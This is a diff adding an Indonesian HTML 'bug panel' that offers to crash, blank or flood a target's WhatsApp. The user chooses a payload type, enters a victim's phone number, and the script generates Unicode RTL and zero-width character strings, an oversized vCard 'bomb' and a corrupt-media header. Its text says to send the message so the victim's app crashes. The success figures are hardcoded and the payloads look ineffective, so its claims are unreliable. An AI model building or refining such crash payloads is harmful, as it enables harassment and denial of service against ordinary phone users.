@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ REO BUG PANEL</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}
+        body{background:#0c0c1a;color:#fff;padding:10px}
+        .container{max-width:480px;margin:0 auto}
+        .header{background:#12121a;border-radius:20px;padding:15px;margin-bottom:15px;border:2px solid #ff3b9c;position:relative}
+        .header::after{content:"ADMIN";position:absolute;top:5px;right:-15px;background:#ffaa00;color:#000;padding:3px 25px;transform:rotate(45deg);font-size:12px}
+        .header-top{display:flex;justify-content:space-between;margin-bottom:10px}
+        .time{background:#1e1e2a;padding:5px 15px;border-radius:40px;color:#ffaa00;border:1px solid #ff3b9c}
+        .dev{background:#ff3b9c;color:#fff;padding:4px 12px;border-radius:40px}
+        .title{display:flex;align-items:center;gap:8px;margin-bottom:10px}
+        .title h1{font-size:40px;background:linear-gradient(145deg,#ff3b9c,#ffaa00);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+        .title span{background:#ff3b9c;color:#fff;padding:3px 10px;border-radius:40px}
+        .role-badge{background:#ffaa00;color:#000;padding:8px;border-radius:40px;text-align:center;font-weight:900}
+        .stats{display:flex;gap:8px;margin-bottom:15px}
+        .stat-item{background:#12121a;border-radius:15px;padding:12px 0;flex:1;text-align:center;border:1px solid #ff3b9c}
+        .stat-value{font-size:24px;font-weight:800;color:#0fa}
+        .stat-label{font-size:10px;color:#99a}
+        .bug-section{background:#12121a;border-radius:20px;padding:15px;margin-bottom:15px;border:2px solid #ff3b9c}
+        .section-header{display:flex;justify-content:space-between;margin-bottom:15px}
+        .section-header h3{color:#ffaa00}
+        .badge{background:#ff3b9c;color:#fff;padding:4px 12px;border-radius:40px}
+        .bug-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:15px}
+        .bug-card{background:#1e1e2a;border:1px solid #2a2a3a;border-radius:12px;padding:10px 3px;text-align:center;cursor:pointer}
+        .bug-card.active{border-color:#ff3b9c;background:#2a1a2a}
+        .bug-card h4{font-size:13px;color:#ffaa00}
+        .bug-card p{font-size:9px;color:#99a}
+        .bug-selector select{width:100%;padding:12px;background:#1e1e2a;border:2px solid #ff3b9c;border-radius:50px;color:#fff}
+        .account-section{background:#12121a;border-radius:20px;padding:15px;margin-bottom:15px;border:2px solid #ff3b9c}
+        .account-row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #2a2a3a}
+        .account-row:last-child{border:0}
+        .account-label{color:#99a}
+        .account-value{color:#ffaa00}
+        .account-value.highlight{color:#ff3b9c}
+        .admin-role{color:#ffaa00;text-align:center;background:#1e1e2a;padding:8px;border-radius:50px;margin-top:10px;border:2px dashed #ffaa00}
+        .timer-section{background:#1e1e2a;border-radius:50px;padding:15px 20px;margin:15px 0;display:flex;justify-content:space-between;border:2px solid #ff3b9c}
+        .timer-value{font-size:28px;font-weight:800;color:#0fa}
+        .input-section{background:#12121a;border-radius:20px;padding:15px;margin-bottom:15px;border:2px solid #ff3b9c}
+        .input-group{margin-bottom:12px}
+        .input-group label{color:#ffaa00;display:block;margin-bottom:5px}
+        .input-group input{width:100%;padding:12px;background:#1e1e2a;border:2px solid #2a2a3a;border-radius:50px;color:#fff}
+        .ecode-row{display:flex;gap:8px}
+        .ecode-row button{background:#ff3b9c;color:#fff;border:0;padding:0 15px;border-radius:50px}
+        .send-btn{background:#ff3b9c;color:#fff;border:0;padding:15px;width:100%;border-radius:60px;font-weight:800;font-size:20px;margin:15px 0;box-shadow:0 5px 0 #992255;cursor:pointer}
+        .result-box{background:#1e1e2a;border:2px dashed #ff3b9c;border-radius:20px;padding:15px;display:none}
+        .result-box.show{display:block}
+        .payload{background:#0a0a12;padding:12px;border-radius:12px;font-family:monospace;font-size:11px;color:#0fa}
+        .footer{text-align:center;color:#336;padding:15px}
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div class="header-top">
+            <div class="time">12.39</div>
+            <div class="dev">REO</div>
+        </div>
+        <div class="title">
+            <h1>REO</h1>
+            <span>BUG</span>
+        </div>
+        <div class="role-badge">👑 ADMIN REO 👑</div>
+    </div>
+    
+    <div class="stats">
+        <div class="stat-item"><div class="stat-value">1</div><div class="stat-label">Online</div></div>
+        <div class="stat-item"><div class="stat-value">0</div><div class="stat-label">Sender</div></div>
+        <div class="stat-item"><div class="stat-value">98%</div><div class="stat-label">Success</div></div>
+    </div>
+    
+    <div class="bug-section">
+        <div class="section-header">
+            <h3>🔥 Pilih Bug</h3>
+            <div class="badge">6 BUGS</div>
+        </div>
+        <div class="bug-grid" id="bugGrid">
+            <div class="bug-card active" data-bug="force_close"><h4>FORCE</h4><p>Crash</p></div>
+            <div class="bug-card" data-bug="blank_ui"><h4>BLANK</h4><p>White</p></div>
+            <div class="bug-card" data-bug="delay"><h4>DELAY</h4><p>Invis</p></div>
+            <div class="bug-card" data-bug="vcard"><h4>VCARD</h4><p>Kontak</p></div>
+            <div class="bug-card" data-bug="unicode"><h4>UNICODE</h4><p>RTL</p></div>
+            <div class="bug-card" data-bug="media"><h4>MEDIA</h4><p>File</p></div>
+        </div>
+        <div class="bug-selector">
+            <select id="bugSelect">
+                <option value="force_close">FORCE CLOSE - Crash WA</option>
+                <option value="blank_ui">BLANK UI - Layar Putih</option>
+                <option value="delay">DELAY INVISIBLE - Pesan Siluman</option>
+                <option value="vcard">VCARD BOMB - Kontak 1000+</option>
+                <option value="unicode">UNICODE RTL - Karakter Khusus</option>
+                <option value="media">MEDIA BUG - File Rusak</option>
+            </select>
+        </div>
+    </div>
+    
+    <div class="account-section">
+        <div class="section-header"><h3>👤 AKUN REO</h3><div class="badge">ADMIN</div></div>
+        <div class="account-row"><span class="account-label">Username</span><span class="account-value">RianModss</span></div>
+        <div class="account-row"><span class="account-label">Role</span><span class="account-value highlight">ADMIN REO</span></div>
+        <div class="account-row"><span class="account-label">Expires</span><span class="account-value">PERMANENT</span></div>
+        <div class="admin-role">⚡ AKSES TAK TERBATAS ⚡</div>
+    </div>
+    
+    <div class="timer-section">
+        <span>⏳ Sesi</span>
+        <span class="timer-value" id="timer">∞</span>
+    </div>
+    
+    <div class="input-section">
+        <div class="input-group">
+            <label>📱 No Target (628xxx)</label>
+            <input type="text" id="targetNumber" placeholder="628123456789" value="628">
+        </div>
+        <div class="input-group">
+            <label>🔑 Kode Admin</label>
+            <div class="ecode-row">
+                <input type="text" id="ecode" placeholder="admin">
+                <button id="redeemBtn">OK</button>
+            </div>
+        </div>
+    </div>
+    
+    <button class="send-btn" id="sendBtn">⚡ EKSEKUSI BUG ⚡</button>
+    
+    <div class="result-box" id="resultBox">
+        <div class="result-title">📦 BUG PAYLOAD:</div>
+        <div class="payload" id="payload"></div>
+    </div>
+    
+    <div class="footer">© RianModss • REO BUG PANEL</div>
+</div>
+
+<script>
+    const bugCards = document.querySelectorAll('.bug-card');
+    const bugSelect = document.getElementById('bugSelect');
+    const sendBtn = document.getElementById('sendBtn');
+    const targetInput = document.getElementById('targetNumber');
+    const ecodeInput = document.getElementById('ecode');
+    const resultBox = document.getElementById('resultBox');
+    const payload = document.getElementById('payload');
+    
+    bugCards.forEach(card => {
+        card.addEventListener('click', function() {
+            bugCards.forEach(c => c.classList.remove('active'));
+            this.classList.add('active');
+            bugSelect.value = this.getAttribute('data-bug');
+        });
+    });
+    
+    document.getElementById('redeemBtn').addEventListener('click', function() {
+        const code = ecodeInput.value.trim().toLowerCase();
+        if(['admin','reo','rianmodss'].includes(code)) {
+            alert('✅ Akses Admin Diverifikasi!');
+        } else {
+            alert('❌ Kode salah! Coba "admin"');
+        }
+    });
+    
+    function generatePayload(type, target) {
+        target = target.replace(/\D/g,'') || '628123456789';
+        
+        const payloads = {
+            force_close: `[FORCE CLOSE - ADMIN]\nTarget: ${target}\nPayload: \\u202E\\u202D${'A'.repeat(200)}\\u202E\\u202D\n\nKirim pesan ini. WA korban akan crash.`,
+            
+            blank_ui: `[BLANK UI - ADMIN]\nTarget: ${target}\nPayload: \\u200B\\u200C\\u200D${'B'.repeat(200)}\\uFFFF`,
+            
+            delay: `[DELAY INVISIBLE - ADMIN]\nTarget: ${target}\nPayload: \\u200B\\u200B\\u200B${'C'.repeat(200)}\\u034F`,
+            
+            vcard: `[VCARD BOMB - ADMIN]\nTarget: ${target}\nBEGIN:VCARD\nVERSION:3.0\nFN:ADMIN BUG\nTEL:${target}\n${'ITEM'.repeat(50)}:DATA\nEND:VCARD`,
+            
+            unicode: `[UNICODE RTL - ADMIN]\nTarget: ${target}\nPayload: \\u202E\\u202E${'D'.repeat(200)}\\u202D\\u202D`,
+            
+            media: `[MEDIA BUG - ADMIN]\nTarget: ${target}\nFile: corrupt.mp4\nHeader: 00 00 00 18 66 74 79 70 6D 70 34 32`
+        };
+        
+        return payloads[type] || payloads.force_close;
+    }
+    
+    sendBtn.addEventListener('click', function() {
+        const target = targetInput.value.trim();
+        if(!target) {
+            alert('Isi nomor target dulu!');
+            return;
+        }
+        
+        const payloadText = generatePayload(bugSelect.value, target);
+        payload.innerText = payloadText;
+        resultBox.classList.add('show');
+        
+        sendBtn.style.background = '#00aa55';
+        setTimeout(() => sendBtn.style.background = '#ff3b9c', 300);
+    });
+</script>
+</body>
+</html>
